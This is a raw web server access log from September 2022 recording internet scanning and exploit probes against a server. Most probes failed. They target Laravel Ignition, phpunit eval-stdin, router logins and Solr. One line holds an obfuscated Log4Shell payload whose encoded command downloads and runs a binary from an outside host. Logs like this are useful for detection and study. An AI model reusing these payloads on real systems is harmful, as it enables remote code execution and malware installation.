172.21.0.1 - - [21/Sep/2022:20:01:31 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xFF\xB6\xFB\xA2\x9E\x10hP{\xCD\xBA|$`\xCF\xC7\x17B\x08\xD0-\x1F\xAC\xC5\x16xw\x02|o\xC3\x14 F\xB0\x08F\xAE\xA9\x8A\xA2\xAA" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:18:33:52 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [26/Sep/2022:18:38:12 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10.11; rv:47.0) Gecko/20100101 Firefox/47.0"
172.27.0.1 - - [26/Sep/2022:18:38:13 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
172.27.0.1 - - [26/Sep/2022:18:38:13 +0000] "GET /favicon.ico HTTP/1.1" 200 8636 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
172.27.0.1 - - [26/Sep/2022:18:38:14 +0000] "GET /robots.txt HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/63.0.3239.132 Safari/537.36 QIHU 360SE"
172.27.0.1 - - [26/Sep/2022:19:54:45 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 zgrab/0.x"
172.27.0.1 - - [26/Sep/2022:20:01:26 +0000] "\x16\x03\x01\x01 \x01\x00\x01\x1C\x03\x03\xD9'5\xB9\x0FK\xA4\xBD\xF9\xC2^\xC9\x16\xDFv'\xE3p\x0B\xBD\xB4\xD9\xE5\x7F\x13  \xB6.F\xB5\xA7 \xE5\xE8\xDB\xDEC7,\xF1\x83\xF2\xBC\xBFAO\x0E\x1A+nf\x8CiVF\x88\xD7\xFA\xB3\x19Q\xF1\xC5\xBA\x00>\x13\x02\x13\x03\x13\x01\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:20:01:26 +0000] "\x16\x03\x01\x00\xBD\x01\x00\x00\xB9\x03\x03\xB4\xEB\x97\x1F\xCF\x12\xE8\x1F@\xED\x9E\x16q\xBFq\xAEHp\x9A0G0g\x19\xC9\x9F\xA2\x98f_\x12\xBF\x00\x008\xC0,\xC00\x00\x9F\xCC\xA9\xCC\xA8\xCC\xAA\xC0+\xC0/\x00\x9E\xC0$\xC0(\x00k\xC0#\xC0'\x00g\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:20:01:29 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x02\x86\x1C]\x89Ls\x11\xBCY\x97\xDEz\xD4{\xB2\xCBl\x91\x94\x1E\xB2\xB3\xC6`w\xDD\xFC\xCBrn\x02\x08\x00\x00\x12\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:20:01:31 +0000] "\x16\x03\x01\x00c\x01\x00\x00_\x03\x01\x95\x19\x00(\x11\xA8\x06aP\xF1\x89\xC2\xB4\xEC\x1A\x06\xA1!\x18\xC5)b\xFA_\xCD\xE0\x9E\x9Cc9\x91\x12\x00\x00\x12\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:20:01:42 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.27.0.1 - - [26/Sep/2022:20:01:47 +0000] "GET /favicon.ico HTTP/1.1" 200 8636 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0"
172.27.0.1 - - [26/Sep/2022:21:59:40 +0000] "GET / HTTP/1.0" 403 146 "-" "-"
172.27.0.1 - - [26/Sep/2022:22:05:19 +0000] "f\x0E\xB9\xB9K\x8F\xF9\xADc\x15\xAD\xD8\x14a\x05\x1B3-\xD4+\x13\x09\x96+\xA9\x85W\x80\x1F\x09\x96+\x12" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:22:05:21 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03-&\xA2@\xA0\x5C\x90\xA3\x80?\xF4qZ\xD2\x11$\xBA\xDB\xC9jjAT'Mo.{\xA0\xA6\xC3v\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:22:05:21 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xB7\xDC\xBE\xEA\xDC\xFF\xB3\xCC\xB5\xB0?j\xA7\x0CR\x90\x80\x82\xC0O)7K\x84p\x99\x89\xF1my\xAB\xB4\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:22:05:21 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 zgrab/0.x"
172.27.0.1 - - [26/Sep/2022:22:07:34 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (compatible; InternetMeasurement/1.0; +https://internet-measurement.com/)"
172.27.0.1 - - [26/Sep/2022:23:00:30 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
172.27.0.1 - - [26/Sep/2022:23:00:31 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (compatible; CensysInspect/1.1; +https://about.censys.io/)"
172.27.0.1 - - [26/Sep/2022:23:00:31 +0000] "PRI * HTTP/2.0" 400 150 "-" "-"
172.27.0.1 - - [26/Sep/2022:23:08:35 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.27.0.1 - - [26/Sep/2022:23:30:24 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.85 Safari/537.36 Edg/90.0.818.46"
172.27.0.1 - - [26/Sep/2022:23:42:15 +0000] "4\x00\x00\x00J\xF7" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:00:35:35 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03;\x91\x05\xB9\x88\x8A\xFE]#\x03\x86\xA3\x82\x9Cp\xA4\xA8\xB4\xC4" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:00:35:35 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x07Y9q2\x875\x18\xBB\xA6\x023M\xF4\xD4\x897\x1F\xA2+f\xAD\xF9O\x84w\x80\x94\x80(ud\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:00:35:36 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 zgrab/0.x"
172.27.0.1 - - [27/Sep/2022:00:38:19 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:19 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:20 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:20 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:20 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:20 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:20 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:21 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:21 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:21 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:21 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:21 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:22 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:22 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:22 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:22 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:23 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:00:38:23 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:01:22:54 +0000] "\x16\x03\x01\x00\xCA\x01\x00\x00\xC6\x03\x03-k\xDE\xB2c\xF6\x06\xCB}Uy%\x80\x90`#\x1E\x1B~ti\xCE\x1D{\xF1\xA7\xFF*\xA0\x88 \xD4\x00\x00h\xCC\x14\xCC\x13\xC0/\xC0+\xC00\xC0,\xC0\x11\xC0\x07\xC0'\xC0#\xC0\x13\xC0\x09\xC0(\xC0$\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:02:43:42 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/88.0.4324.190 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:02:47:39 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
172.27.0.1 - - [27/Sep/2022:02:47:40 +0000] "GET /Public/home/js/check.js HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
172.27.0.1 - - [27/Sep/2022:02:47:41 +0000] "GET /static/admin/javascript/hetong.js HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Linux; Android 10; LIO-AN00 Build/HUAWEILIO-AN00; wv) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/103.0.5060.114 Mobile Safari/537.36"
172.27.0.1 - - [27/Sep/2022:02:48:07 +0000] "GET /0bef HTTP/1.0" 404 146 "-" "-"
172.27.0.1 - - [27/Sep/2022:03:15:24 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:00:13 +0000] "\xAA\xAA\xAA\xAAUUUUUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAAUUUU\xAA\xAA\xAA\xAA" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:05:29 +0000] "\xE2\xB93\xF4\x06JQ\xB30\xC0hC[\xB7\xD2yp\xEB\xF3\xFFP\xCF\xB1\xFF\xEACpT\x5C\xCF\xB1\xFFQ\xCB\xF3\xFFP\xCF\xB2\xF7P\xCF\xB1\xFFP\xCF\xB1\xFF\xFA\xCF\xB1\xFFP\xCF\x9A\xD4P\xCF\xB1\xFFx\xCF\xB1\xFFP\xCF\xB1\xFFP\xCF\xB1\xFFP\xCF\xB1\xFFQ\xCE\xB1\xFFP\xCF\xA7\xFFP\xCF\xB1\xFFP\xCF\xB1\xFFP\xCF\xB1\xFFP\xCF\xB1\xFFP\xCF\xB5\xFFP\xCF\xB1\xFFP\xCF\xB1\xFF\x04\x00" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:05:31 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\x99K\xBF\xBAU\xB3~\xD9\x0E~?9\xF9\xD9[\x9F\x97O\xE2\x91\x8BE\xF5Rr\x80/\xB6q#e-\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:05:31 +0000] "\x16\x03\x01\x00{\x01\x00\x00w\x03\x03\xF5qF\xC43/\xB2\x0C\x0F\xD9\xF2\x84\xE7\xD0\xD9(F\xED8%\xB51\x8B%+\xC1\x04\xB8\xA8\xFE\xDD\xA7\x00\x00\x1A\xC0/\xC0+\xC0\x11\xC0\x07\xC0\x13\xC0\x09\xC0\x14\xC0" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:29:45 +0000] "GET / HTTP/1.1" 403 146 "-" "python-requests/2.28.1"
172.27.0.1 - - [27/Sep/2022:04:33:49 +0000] "POST /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:04:41:33 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/52.0.2743.116 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:04:56:14 +0000] "GET /boaform/admin/formLogin?username=user&psd=user HTTP/1.0" 404 146 "-" "-"
172.27.0.1 - - [27/Sep/2022:04:59:19 +0000] "GET / HTTP/1.1" 403 146 "-" "-"
172.27.0.1 - - [27/Sep/2022:05:14:32 +0000] "GET / HTTP/1.1" 403 146 "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY2htb2QgNzc3IGlkc2hhMWdhbWU7IC4vaWRzaGExZ2FtZSBydW5uZXI=}')" "t('${${env:NaN:-j}ndi${env:NaN:-:}${env:NaN:-l}dap${env:NaN:-:}//168.138.128.171:1389/TomcatBypass/Command/Base64/d2dldCBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY3VybCAtTyBodHRwOi8vMTY4LjEzOC4xMjguMTcxL3BlcmwvaWRzaGExZ2FtZTsgY2htb2QgNzc3IGlkc2hhMWdhbWU7IC4vaWRzaGExZ2FtZSBydW5uZXI=}')"
172.27.0.1 - - [27/Sep/2022:05:21:27 +0000] "GET /vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:05:53:26 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (Windows NT 5.1; rv:9.0.1) Gecko/20100101 Firefox/9.0.1"
172.27.0.1 - - [27/Sep/2022:06:01:24 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 146 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:83.0) Gecko/20100101 Firefox/83.0"
172.27.0.1 - - [27/Sep/2022:06:08:45 +0000] "GET /solr/ HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:18:06 +0000] "GET /solr/admin/info/system?wt=json HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:21:41 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 zgrab/0.x"
172.27.0.1 - - [27/Sep/2022:06:46:38 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:39 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:39 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:39 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:41 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:41 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:41 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:42 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:42 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:43 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:43 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:43 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:44 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:06:46:44 +0000] "POST /_ignition/execute-solution HTTP/1.1" 404 548 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:26:41 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 404 146 "http://77.40.48.136:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
172.27.0.1 - - [27/Sep/2022:07:26:41 +0000] "" 400 0 "-" "-"
172.27.0.1 - - [27/Sep/2022:07:30:21 +0000] "GET / HTTP/1.1" 403 146 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/601.7.7 (KHTML, like Gecko) Version/9.1.2 Safari/601.7.7"
172.27.0.1 - - [27/Sep/2022:07:35:22 +0000] "\x16\x03\x01\x00M\x01\x00\x00I\x03\x03\xD1\xAA#\x0B9[`@\xBD\x1F\xCD\xC3W\xD8}\x1C\x13\x85 \xB8\xD0}dt\xB32\xA5\x90&N\x12\xDE r,\xADQm\x09`F\xDE" 400 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:07:35:27 +0000] "OPTIONS / HTTP/1.0" 405 150 "-" "-"
172.27.0.1 - - [27/Sep/2022:07:48:34 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:48:34 +0000] "GET /favicon.ico HTTP/1.1" 200 8636 "http://77.40.48.136/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:48:39 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:48:59 +0000] "GET / HTTP/1.1" 403 548 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /login HTTP/1.1" 301 162 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /login/ HTTP/1.1" 200 2677 "-" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /_nuxt/bc98b6b.js HTTP/1.1" 304 0 "http://localhost/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /_nuxt/57e2371.js HTTP/1.1" 304 0 "http://localhost/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /_nuxt/644807f.js HTTP/1.1" 304 0 "http://localhost/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
172.27.0.1 - - [27/Sep/2022:07:49:05 +0000] "GET /_nuxt/ddebb14.js HTTP/1.1" 304 0 "http://localhost/login/" "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/105.0.0.0 Safari/537.36"
